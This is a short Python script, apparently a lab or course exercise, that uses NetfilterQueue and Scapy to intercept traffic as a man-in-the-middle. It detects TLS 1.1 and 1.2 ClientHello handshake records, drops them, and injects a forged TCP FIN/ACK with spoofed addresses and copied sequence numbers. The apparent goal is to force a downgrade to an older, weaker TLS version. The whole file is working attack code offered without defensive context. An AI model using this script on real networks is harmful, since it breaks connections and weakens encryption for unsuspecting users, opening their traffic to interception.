from netfilterqueue import NetfilterQueue
from scapy.all import *


def print_and_accept(pkt):
    
    ip = IP(pkt.get_payload())
    
    if ip.haslayer(Raw):
        tcp_load = ip[Raw].load
        #catch handshake
        if tcp_load[0] == 0x16:
            print("handaske is catched")
            #check version
            if tcp_load[9] == 0x03 and (tcp_load[10] == 0x03 or tcp_load[10] == 0x02):
                # drop packet
                print("packet is dropped")
                pkt.drop()

                # create new packet
                downgraded_pkt = IP(src ="172.16.0.3", dst="128.179.33.29")/TCP()
                downgraded_pkt[TCP].ack = ip[TCP].ack
                downgraded_pkt[TCP].dport = ip[TCP].dport
                downgraded_pkt[TCP].flags = 'FA'
                downgraded_pkt[TCP].seq = ip[TCP].seq
                downgraded_pkt[TCP].sport = ip[TCP].sport
            
                print("new packet is created")
                send(downgraded_pkt)
                print("new packet is sent")
                return              

    pkt.accept()

def sniff():
   nfqueue = NetfilterQueue()
   nfqueue.bind(0,print_and_accept,100)
   try:
      nfqueue.run()
   except KeyboardInterrupt:
      print('')
   nfqueue.unbind()

sniff()
